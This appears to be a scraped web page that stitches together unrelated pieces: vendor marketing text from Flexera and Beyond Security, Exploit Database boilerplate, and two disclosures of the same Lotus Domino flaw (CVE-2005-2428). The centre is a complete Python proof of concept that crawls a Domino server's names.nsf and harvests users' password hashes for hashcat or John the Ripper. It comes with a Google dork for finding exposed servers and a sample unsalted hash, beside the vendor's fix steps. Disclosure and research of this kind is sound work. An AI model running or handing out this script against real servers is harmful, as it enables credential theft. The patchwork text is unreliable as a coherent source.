How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Exploit Title: IBM Lotus Domino <= R8 Password Hash Extraction Exploit
# Google Dork: inurl:names.nsf?opendatabase
# Date: 02-24-2016
# Exploit Author: Jonathan Broche
# Contact: https://twitter.com/g0jhonny
# Vendor Homepage: https://www-01.ibm.com/software/lotus/category/messaging/
# Tested on: Lotus Domino 8.5
# CVE : CVE-2005-2428

1. Description

IBM Domino Databases contain a configuration issue allowing users to obtain password hashes, configuraiton information and more from the Public Address Book (i.e., names.nsf database). Password hashes are obtained from the hidden HTML HTTPPassword and dspHTTPPassword fields per user in the database.

2. Proof of Concept

#!/usr/bin/env python2

import requests, re, BeautifulSoup, sys, argparse, os
requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser(description='Domino Effect - A Lotus Domino password hash tool by Jonathan Broche (@g0jhonny)', version="1.0")
parser.add_argument('system', help="IP address or hostname to harvest hashes from. ")
parser.add_argument('-u', '--uri', metavar='path', default="/names.nsf", help="Path to the names.nsf file. [Default: /names.nsf]")
outgroup = parser.add_argument_group(title="Output Options")
outgroup.add_argument('--hashcat', action='store_true',  help="Print results for use with hashcat.")
outgroup.add_argument('--john', action='store_true', help="Print results for use with John the Ripper.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()
print "\nDomino Effect {}\n".format(parser.version)

headers={'User-Agent':'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3'}

try:
    response = requests.get("https://{}{}/People?OpenView".format(args.system, args.uri), verify=False, headers=headers, timeout=3)
except requests.exceptions.Timeout as e:
    print "[!] Timed out, try again."
    sys.exit(1)
except Exception as e:
        print e

soup = BeautifulSoup.BeautifulSoup(response.text)

links = []

#grab all user profile links
for link in soup.findAll('a'):
    if "OpenDocument" in link['href']:
        if link['href'] not in links:
	        links.append(link['href'])

hashes = {}
for link in links: #get user profile
    try:
        response = requests.get("https://{}{}".format(args.system, link), verify=False, headers=headers, timeout=2)
    except requests.exceptions.Timeout as e:
        pass
    except Exception as e:
        print e

    if response.text:
        soup = BeautifulSoup.BeautifulSoup(response.text)

        name = soup.find('input', {'name' : '$dspShortName'}).get('value').strip() #short name
        httppassword = soup.find('input', { "name" : "HTTPPassword"}).get('value').strip()
        dsphttppassword = soup.find('input', { "name" : "dspHTTPPassword"}).get('value').strip()

        if httppassword and httppassword not in hashes.keys():
            hashes[httppassword] = name
        elif dsphttppassword and dsphttppassword not in hashes.keys():
            hashes[dsphttppassword] = name

if hashes: #output
    if args.hashcat or args.john:
        if args.hashcat:
            for h in hashes.keys():
                print h
        if args.john:
            for h, n in hashes.items():
                print "{}:{}".format(n,h)
    else:
        for h, n in hashes.items():
            print "[*] User: {} Hash: {}".format(n, h)

print "\n{} hashes obtained\n".format(len(hashes))

3. Solution

To hide the HTTP password from the HTML source:

1) Open the $PersonalInheritableSchema subform (In the designer under Shared Code, Subforms).
2) Find the fields: $dspHTTPPassword and HTTPPassword.
3) In the field properties for both fields, on the hide tab under "Hide paragram from" check off "Web browsers".
4) Open the Person form (Under Forms).
5) In the form properties, on the 2nd tab, disable the option "Generate HTML for all fields".

In addition, ensure proper firewalls are in place within your environment to prevent public exposure of the names.nsf database and other senstive files.

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![lightning bolt icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-critical-industries.png)

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.

Advisory Name: Default Configuration Information Disclosure in Lotus
Domino (Including password hashes)

Vulnerability Class: Default Configuration/Information Disclosure

Release Date: 07/26/2005

Affected Applications:
* Lotus Domino R5 WebMail
* Lotus Domino R6 WebMail
* Lotus Domino R4 wasn't audited.

Affected Platforms:
* Platform-Independent

Local / Remote: Remote

Severity: High

Author:  Leandro Meiners.

Vendor Status:
* Configuration fix supplied by vendor.

Reference to Vulnerability Disclosure Policy:
<http://www.cybsec.com/vulnerability_policy.pdf>

Overview:
=========

IBM Lotus Domino is an integrated collaborative environment, which
allows messaging, calendaring and scheduling capabilities. IBM Lotus
Domino WebMail is one of the client components for accessing Lotus
Domino messaging capabilities, which provides a Web interface to Lotus
Domino.

Vulnerability Description:
==========================

The main directory database for Lotus Domino, names.nsf, defined as the
Public Address Book is by default readable by all users. Therefore, all
users are allowed to view a person's entry.

When any unprivileged user views a person's entry there is a field
called "Internet Password" that is blank, meaning that the user can't
view the password hash. However, if the Web page is edited ("view page
source" in Internet Explorer) there is a hidden field called
"HTTPPassword" which contains the password hash.

The same problem applies to all other fields that appear as blank; if
they have a valued defined then that value is stored in a hidden field.

Other critical information can be retrieved (under Release 6), such as:

* The change date of the password (field "HTTPPasswordChangeDate")
* The client's platform (field "ClntPltfrm")
* The client's machine name (field "ClntMachine")
* The client's Lotus Domino release (field "ClntBld")

Exploit:
========

No exploit required. Nevertheless, it is appropriate to mention that
there are Lotus Domino password crackers such as Domino Hash Breaker
(tested on Lotus Domino R5 and R6 with the appropriate DLL), available
at <http://www.securiteinfo.com/outils/DominoHashBreaker.shtml>.

Furthermore, the algorithm used by Lotus Domino to hash the password
doesn't use a salt, meaning that the string
"355E98E7C7B59BD810ED845AD0FD2FC4" is always the hash for the string
"password". This allows passwords to be pre-computed in order to
construct a hash database of common passwords or even all six to eight
digit character combinations, minimizing the time needed to crack a
password.

Solutions:
==========

IBM's solution to the problem:

To hide the HTTP password from the HTML source:

1) Open the $PersonalInheritableSchema subform (In the designer under
Shared Code, Subforms).
2) Find the fields: $dspHTTPPassword and HTTPPassword.
3) In the field properties for both fields, on the hide tab under "Hide
paragram from" check off "Web browsers".
4) Open the Person form (Under Forms).
5) In the form properties, on the 2nd tab, disable the option "Generate
HTML for all fields".

We found step five to be sufficient to hide all the above mentioned
fields.

Vendor Response:
================

04/22/2005: Initial Vendor Contact
05/09/2005: Vendor response stating that they couldn't find a way to
remove the hidden fields.
06/02/2005: Vendor opens a new case regarding the vulnerability.
06/28/2005: Vendor response with a configuration to fix the
vulnerability.

Thanks:
=======

Special thanks goes to Claudia Iaconis, Adrian Saucedo and Tadeo Cwierz.
